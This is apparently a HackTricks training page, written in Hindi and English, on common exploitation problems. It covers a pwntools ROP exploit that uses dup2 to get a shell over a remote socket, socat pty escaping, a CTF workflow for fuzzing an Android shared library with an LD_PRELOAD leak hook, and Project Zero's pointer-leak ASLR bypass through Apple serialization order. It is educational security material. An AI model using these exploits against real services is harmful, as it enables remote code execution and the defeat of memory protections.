# सामान्य एक्सप्लॉइटिंग समस्याएँ

{{#include ../banners/hacktricks-training.md}}

## FDs in Remote Exploitation

जब आप किसी दूरस्थ सर्वर को exploit भेजते हैं जो उदाहरण के लिए **`system('/bin/sh')`** कॉल करता है, तो यह सर्वर प्रोसेस में चलेगा, और `/bin/sh` stdin (FD: `0`) से इनपुट की उम्मीद करेगा और stdout और stderr (FDs `1` और `2`) में आउटपुट छापेगा। इसलिए हमलावर shell के साथ इंटरैक्ट नहीं कर पाएगा।

इसे ठीक करने का एक तरीका यह मानना है कि जब सर्वर स्टार्ट हुआ था तो उसने listening के लिए **FD number `3`** बनाया था और तब आपकी कनेक्शन **FD number `4`** पर होगी। इसलिए syscall **`dup2`** का उपयोग करके stdin (FD 0) और stdout (FD 1) को FD 4 (हमलावर के कनेक्शन वाला) पर डुप्लिकेट करना संभव है, जिससे shell चलने के बाद उससे संपर्क करना मुमकिन हो जाएगा।

[**Exploit example from here**](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit):
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = remote('localhost', 9001)

rop = ROP(elf)
rop.raw('A' * 40)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.win()

p.sendline(rop.chain())
p.recvuntil('Thanks!\x00')
p.interactive()
```
## Socat & pty

ध्यान दें कि socat पहले से ही **`stdin`** और **`stdout`** को socket पर ट्रांसफर करता है। हालाँकि, `pty` मोड में **DELETE characters शामिल होते हैं**। इसलिए, यदि आप एक `\x7f` (`DELETE` -) भेजते हैं तो यह आपके exploit के पिछले character को **डिलीट** कर देगा।

इसे बायपास करने के लिए **escape character `\x16` को किसी भी भेजे जाने वाले `\x7f` के आगे prepend किया जाना चाहिए।**

**Here you can** [**find an example of this behaviour**](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)**.**

## Android AArch64 shared-library fuzzing & LD_PRELOAD hooking

जब कोई Android ऐप केवल एक stripped AArch64 `.so` के साथ आता है, तब भी आप बिना APK को फिर से बनाने के डिवाइस पर सीधे exported logic को fuzz कर सकते हैं। एक व्यावहारिक वर्कफ़्लो:

1. **Locate callable entry points.** `objdump -T libvalidate.so | grep -E "validate"` exported functions को जल्दी से सूचीबद्ध करता है। Decompilers (Ghidra, IDA, BN) वास्तविक signature प्रकट करते हैं, उदाहरण के लिए `int validate(const uint8_t *buf, uint64_t len)`.
2. **Write a standalone harness.** एक फ़ाइल लोड करें, buffer को सक्रिय रखें, और exported symbol को बिल्कुल वैसे ही कॉल करें जैसे ऐप करेगा। NDK के साथ cross-compile करें (उदा. `aarch64-linux-android21-clang harness.c -L. -lvalidate -fPIE -pie`).

<details>
<summary>न्यूनतम फ़ाइल-चालित harness</summary>
```c
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

extern int validate(const uint8_t *buf, uint64_t len);

int main(int argc, char **argv) {
if (argc < 2) return 1;
int fd = open(argv[1], O_RDONLY);
if (fd < 0) return 1;
struct stat st = {0};
if (fstat(fd, &st) < 0) return 1;
uint8_t *buffer = malloc(st.st_size + 1);
read(fd, buffer, st.st_size);
close(fd);
int ret = validate(buffer, st.st_size);
free(buffer);
return ret;
}
```
</details>

3. **Reconstruct the expected structure.** Error strings और comparisons ने Ghidra में दिखाया कि फ़ंक्शन strict JSON को पार्स करता है जिसमें constant keys (`magic`, `version`, nested `root.children.*`) और arithmetic checks होते हैं (उदा., `value * 2 == 84` ⇒ `value` होना चाहिए `42`)। syntactically valid JSON को धीरे-धीरे प्रत्येक ब्रांच को संतुष्ट करने के लिए फीड करने से आप instrumentation के बिना schema का मैप बना सकते हैं।
4. **anti-debug को बायपास करके secrets को leak करें.** क्योंकि `.so` `snprintf` को import करता है, इसे `LD_PRELOAD` से override करके संवेदनशील format strings को dump करें, भले ही breakpoints blocked हों:

<details>
<summary>न्यूनतम snprintf leak hook</summary>
```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>

typedef int (*vsnprintf_t)(char *, size_t, const char *, va_list);

int snprintf(char *str, size_t size, const char *fmt, ...) {
static vsnprintf_t real_vsnprintf;
if (!real_vsnprintf)
real_vsnprintf = (vsnprintf_t)dlsym(RTLD_NEXT, "vsnprintf");

va_list args;
va_start(args, fmt);
va_list args_copy;
va_copy(args_copy, args);
if (fmt && strstr(fmt, "MHL{")) {
fprintf(stdout, "[LD_PRELOAD] flag: ");
vfprintf(stdout, fmt, args);
fputc('\n', stdout);
}
int ret = real_vsnprintf(str, size, fmt, args_copy);
va_end(args_copy);
va_end(args);
return ret;
}
```
</details>

`LD_PRELOAD=./hook.so ./validate_harness payload.json` आंतरिक flag को exfiltrate करता है और binary को patch किए बिना crash oracle की पुष्टि करता है.
5. **Fuzz space को कम करें।** Disassembly ने एक XOR key उजागर किया जो flag तुलना में पुन: प्रयुक्त हुआ, जिसका मतलब था कि `flag` के पहले सात bytes ज्ञात थे। केवल नौ अज्ञात bytes को ही fuzz करें।
6. **Fuzz bytes को एक वैध JSON envelope के भीतर embed करें।** AFL harness ठीक नौ bytes `stdin` से पढ़ता है, उन्हें flag suffix में कॉपी करता है, और हर अन्य field (constants, tree depths, arithmetic preimage) को hard-code करता है। कोई भी malformed read बस exit कर देता है, इसलिए AFL meaningful testcases पर cycles खर्च करता है:

<details>
<summary>Minimal AFL harness</summary>
```c
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

extern int validate(unsigned char *bytes, size_t len);

#define FUZZ_SIZE 9

int main(void) {
uint8_t blob[FUZZ_SIZE];
if (read(STDIN_FILENO, blob, FUZZ_SIZE) != FUZZ_SIZE) return 0;
char suffix[FUZZ_SIZE + 1];
memcpy(suffix, blob, FUZZ_SIZE);
suffix[FUZZ_SIZE] = '\0';
char json[512];
int len = snprintf(json, sizeof(json),
"{\"magic\":16909060,\"version\":1,\"padding\":0,\"flag\":\"MHL{827b07c%s}\"," \
"\"root\":{\"type\":16,\"level\":3,\"num_children\":1,\"children\":[" \
"{\"type\":32,\"level\":2,\"num_children\":1,\"subchildren\":[" \
"{\"type\":48,\"level\":1,\"num_children\":1,\"leaves\":[" \
"{\"type\":64,\"level\":0,\"reserved\":0,\"value\":42}]}}]}}",
suffix);
if (len <= 0 || (size_t)len >= sizeof(json)) return 0;
validate((unsigned char *)json, len);
return 0;
}
```
</details>

7. **Run AFL with the crash-as-success oracle.** कोई भी input जो हर semantic check को पास करे और सही nine-byte suffix अनुमान लगाए, वह deliberate crash को ट्रिगर करता है; वे फाइलें `output/crashes` में आती हैं और simple harness के माध्यम से replay कर secret recover किया जा सकता है।

यह workflow आपको anti-debug-protected JNI validators को जल्दी triage करने, जरूरत पड़ने पर leak secrets करने, और फिर केवल meaningful bytes को fuzz करने की अनुमति देता है — वह भी original APK को छुए बिना।

## Pointer-Keyed Hash Table Pointer Leaks on Apple Serialization

### आवश्यकताएँ & attack surface

- एक service attacker-controlled property lists (XML या binary) स्वीकार करती है और permissive allowlist के साथ `NSKeyedUnarchiver.unarchivedObjectOfClasses` को कॉल करती है (उदा., `NSDictionary`, `NSArray`, `NSNumber`, `NSString`, `NSNull`)।
- परिणामी objects को पुन: उपयोग किया जाता है और बाद में `NSKeyedArchiver` के साथ फिर से serialized किया जाता है (या deterministic bucket order में iterate किया जाता है) और attacker को वापस भेजा जाता है।
- कंटेनरों में किसी key type द्वारा उसके hash code के रूप में pointer values का उपयोग होता है। March 2025 से पहले, `CFNull`/`NSNull` fallback करके `CFHash(object) == (uintptr_t)object` था, और deserialization हमेशा shared-cache singleton `kCFNull` लौटाता था, जिससे memory corruption या timing के बिना एक स्थिर kernel-shared pointer मिलता था।

### नियंत्रित करने योग्य hashing primitives

- **Pointer-based hashing:** `CFNull`’s `CFRuntimeClass` में hash callback नहीं होता, इसलिए `CFBasicHash` object address को hash के रूप में उपयोग करता है। क्योंकि singleton reboot तक एक fixed shared-cache address पर रहता है, इसका hash processes में स्थिर रहता है।
- **Attacker-controlled hashes:** 32-bit `NSNumber` keys `_CFHashInt` के माध्यम से hashed होते हैं, जो deterministic और attacker-controllable है। विशेष integers चुनकर attacker किसी भी table size के लिए `hash(number) % num_buckets` चुन सकता है।
- **`NSDictionary` implementation:** Immutable dictionaries एक `CFBasicHash` embed करते हैं जिसमें prime bucket count `__CFBasicHashTableSizes` से चुना जाता है (उदा., 23, 41, 71, 127, 191, 251, 383, 631, 1087)। Collisions को linear probing (`__kCFBasicHashLinearHashingValue`) से handle किया जाता है, और serialization buckets को numeric order में walk करता है; इसलिए serialized keys का order encode करता है कि प्रत्येक key ने अंततः किस bucket index को occupy किया।

### Encoding bucket indices into serialization order

ऐसा plist बनाकर जो एक dictionary materialize करे और जिसके buckets occupied और empty slots के बीच alternate करें, attacker यह सीमित कर देता है कि linear probing `NSNull` को कहाँ place कर सकता है। 7-bucket उदाहरण के लिए, even buckets को `NSNumber` keys से भरने पर मिलता है:
```text
bucket:          0 1 2 3 4 5 6
occupancy:       # _ # _ # _ #
```
During deserialization the victim inserts the single `NSNull` key. Its initial bucket is `hash(NSNull) % 7`, but probing advances until hitting one of the open indices {1,3,5}. The serialized key order reveals which slot was used, disclosing whether the pointer hash modulo 7 lies in {6,0,1}, {2,3}, or {4,5}. Because the attacker controls the original serialized order, the `NSNull` key is emitted last in the input plist so the post-reserialization ordering is solely a function of bucket placement.

### पूरक तालिकाओं के साथ सटीक अवशेष निर्धारित करना

A single dictionary only leaks a range of residues. To determine the precise value of `hash(NSNull) % p`, build **two** dictionaries per prime bucket size `p`: one with even buckets pre-filled and one with odd buckets pre-filled. For the complementary pattern (`_ # _ # _ # _`), the empty slots (0,2,4,6) map to residue sets {0}, {1,2}, {3,4}, {5,6}. Observing the serialized position of `NSNull` in both dictionaries narrows the residue to a single value because the intersection of the two candidate sets yields a unique `r_i` for that `p`.

The attacker bundles all dictionaries inside an `NSArray`, so a single deserialize → serialize round trip leaks residues for every chosen table size.

### 64-bit shared-cache pointer का पुनर्निर्माण

For each prime `p_i ∈ {23, 41, 71, 127, 191, 251, 383, 631, 1087}`, the attacker recovers `hash(NSNull) ≡ r_i (mod p_i)` from the serialized ordering. Applying the Chinese Remainder Theorem (CRT) with the extended Euclidean algorithm yields:
```text
Π p_i = 23·41·71·127·191·251·383·631·1087 = 0x5ce23017b3bd51495 > 2^64
```
इसलिए संयुक्त अवशेष विशिष्ट रूप से `kCFNull` के 64-बिट पॉइंटर के बराबर होता है। Project Zero PoC मध्यवर्ती moduli प्रिंट करते हुए समरूपताओं (congruences) को आवर्ती रूप से मिलाता है ताकि असली पते (`0x00000001eb91ab60` on the vulnerable build) की ओर समेकन दिख सके।

### व्यावहारिक कार्यप्रवाह

1. **Generate crafted input:** अटैकर-साइड XML plist बनाएं (प्रत्येक prime के लिए दो dictionaries, `NSNull` serialized last) और इसे binary फॉर्मेट में परिवर्तित करें।
```bash
clang -o attacker-input-generator attacker-input-generator.c
./attacker-input-generator > attacker-input.plist
plutil -convert binary1 attacker-input.plist
```
2. **Victim round trip:** Victim सर्विस `NSKeyedUnarchiver.unarchivedObjectOfClasses` के साथ allowed classes set `{NSDictionary, NSArray, NSNumber, NSString, NSNull}` का उपयोग करके deserializes करती है और तुरंत `NSKeyedArchiver` के साथ re-serializes कर देती है।
3. **Residue extraction:** लौटाए गए plist को XML में वापस बदलने से dictionary key ordering खुलती है। `extract-pointer.c` जैसे एक helper object table पढ़ता है, singleton `NSNull` का index निर्धारित करता है, प्रत्येक dictionary pair को उसके bucket residue से मैप करता है, और CRT सिस्टम को हल करके shared-cache pointer को पुनः प्राप्त करता है।
4. **Verification (optional):** एक छोटा Objective-C helper कंपाइल करना जो `CFHash(kCFNull)` प्रिंट करता है, पुष्टि करता है कि leaked value वास्तविक पते से मेल खाता है।

किसी memory safety bug की आवश्यकता नहीं है—केवल pointer-keyed संरचनाओं के serialization क्रम का अवलोकन करना ही एक remote ASLR bypass primitive देता है।

## संबंधित पृष्ठ

{{#ref}}
../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

{{#ref}}
../reversing/reversing-tools-basic-methods/README.md
{{#endref}}

## References

- [FD duplication exploit example](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit)
- [Socat delete-character behaviour](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)
- [FuzzMe – Reverse Engineering and Fuzzing an Android Shared Library](https://hackmd.io/@sal/fuzzme-mobilehackinglab-ctf-writeup)
- [Pointer leaks through pointer-keyed data structures (Project Zero)](https://projectzero.google/2025/09/pointer-leaks-through-pointer-keyed.html)

{{#include ../banners/hacktricks-training.md}}
